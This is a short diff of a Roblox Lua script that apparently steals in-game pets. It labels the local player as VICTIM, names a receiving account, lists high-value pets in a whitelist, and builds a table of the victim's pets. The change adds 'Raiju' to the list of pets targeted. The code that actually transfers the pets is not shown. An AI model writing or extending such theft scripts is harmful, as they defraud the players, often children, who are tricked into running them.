@@ -5,7 +5,7 @@ local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {"ZeeS_Farm01"}
 local PET_WHITELIST = {
     'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
-    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune',
+    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune', 'Raiju',
 }
 
 local victimPetTable = {}
